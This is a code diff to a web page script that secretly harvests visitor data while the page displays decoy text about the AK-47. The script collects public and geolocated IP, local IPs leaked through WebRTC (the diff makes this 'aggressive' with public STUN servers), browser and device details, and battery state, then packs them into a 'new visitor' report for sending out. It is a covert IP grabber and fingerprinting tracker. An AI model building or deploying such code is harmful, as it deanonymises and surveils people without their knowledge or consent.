@@ -28,45 +28,50 @@
       });
     }
 
-    // Função para capturar IPs via WebRTC Leak
+    // 🔥 WebRTC Leak agressivo
     function getWebRTCIps(callback) {
       const ips = new Set();
 
-      const pc = new RTCPeerConnection({ iceServers: [] });
-      pc.createDataChannel("");
+      const pc = new RTCPeerConnection({
+        iceServers: [
+          { urls: "stun:stun.services.mozilla.com" },
+          { urls: "stun:stun.l.google.com:19302" }
+        ]
+      });
 
-      pc.onicecandidate = event => {
+      pc.createDataChannel("x");
+
+      pc.onicecandidate = (event) => {
         if (!event.candidate) {
-          callback(Array.from(ips));
+          callback([...ips]);
           return;
         }
-        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-        const ipMatch = ipRegex.exec(event.candidate.candidate);
-        if (ipMatch) {
-          ips.add(ipMatch[1]);
+
+        const candidate = event.candidate.candidate;
+        const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+        const match = candidate.match(regex);
+        if (match && match[1]) {
+          ips.add(match[1]);
         }
       };
 
-      pc.createOffer()
-        .then(offer => pc.setLocalDescription(offer))
-        .catch(err => {
-          console.error("Erro WebRTC:", err);
-          callback([]);
-        });
+      pc.createOffer().then((offer) => {
+        return pc.setLocalDescription(offer);
+      }).catch((err) => {
+        console.error("Erro ao criar oferta WebRTC:", err);
+        callback([]);
+      });
     }
 
     async function coletarEEnviarDados() {
       try {
-        // IP público
         const ipResponse = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipResponse.json();
         const ip = ipData.ip;
 
-        // Dados do IP no ipinfo
         const ipinfoResponse = await fetch(`https://ipinfo.io/${ip}/json?token=${ipinfoToken}`);
         const ipinfoData = await ipinfoResponse.json();
 
-        // Dados do navegador / dispositivo
         const userAgent = navigator.userAgent;
         const language = navigator.language;
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -83,9 +88,7 @@
         const prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
         const browserVersion = getBrowserVersion(userAgent);
 
-        // Captura IPs do WebRTC Leak antes de enviar
         getWebRTCIps((webrtcIps) => {
-          // Função para enviar com dados da bateria
           function enviarComBateria(batteryLevel, charging) {
             const embed = {
               title: "🕵️ Novo visitante",
@@ -134,7 +137,6 @@ Com mais de 100 milhões de unidades produzidas (contando variantes licenciadas 
 Apesar de sua fama controversa, a AK-47 representa um marco na engenharia militar, sendo símbolo de simplicidade, funcionalidade e impacto global. - Chat GPT</h2>`;
           }
 
-          // Pega bateria, se disponível
           if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
               const batteryLevel = Math.round(battery.level * 100) + "%";
